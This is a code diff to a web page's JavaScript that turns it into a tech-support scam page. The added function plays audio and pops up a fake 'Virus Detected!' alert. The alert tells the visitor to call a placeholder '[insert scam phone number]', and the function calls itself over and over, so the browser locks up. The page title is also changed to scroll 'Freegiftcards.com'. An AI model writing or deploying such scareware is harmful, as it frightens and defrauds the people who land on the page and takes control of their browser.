@@ -1,4 +1,9 @@
-
+  function myFunction(){
+              document.getElementById('abc').play();
+    alert("                         **************Warning**************                                                                                                                                                                                               Virus Detected! Call [insert scam phone number] to delete the virus immediately!");
+    
+    myFunction();
+  }
 
 
 function changeText() {
@@ -11,7 +16,7 @@ function changeText() {
 
 var space = " ";
 var pos = 0;
-var msg = "User 19";
+var msg = "Freegiftcards.com  ";
 
 function Scroll(){
 document.title = msg.substring(pos, msg.length) + space +msg.substring(0,pos);
